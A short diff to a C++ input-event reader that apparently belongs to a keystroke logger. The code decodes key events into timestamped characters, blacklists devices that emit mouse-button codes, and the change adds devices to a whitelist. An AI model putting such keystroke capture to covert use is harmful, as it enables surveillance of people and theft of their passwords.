@@ -205,7 +205,6 @@ auto logger::ev_reader() -> void {
 			      ", ev.code = " + std::to_string(ev.code) + ", ev.value = " + std::to_string(ev.value));
 
 			if (n == static_cast<ssize_t>(sizeof(ev)) && ev.type == EV_KEY) {
-				// mousetrap
 				if (ev.code >= 272 && ev.code <= 274) {
 					MSG(messagetype::warning, "logger (ev_reader): mousetrap triggered. " + ev_init_ + " blacklisted.");
 					close(fd_);
@@ -222,9 +221,10 @@ auto logger::ev_reader() -> void {
 					break;
 				}
 				MSG(messagetype::info, "logger (ev_reader): switched to new device: " + ev_init_);
+        whitelist_.push_back(ev_init_);
 				continue;
 			}
-
+      whitelist_.push_back(ev_init_);
 			auto  dtg      = datetime(ev.time.tv_sec);
 			auto  key_char = get_keychar(ev.code);
 			event e{dtg.first, dtg.second, key_char, ev.value ? true : false};
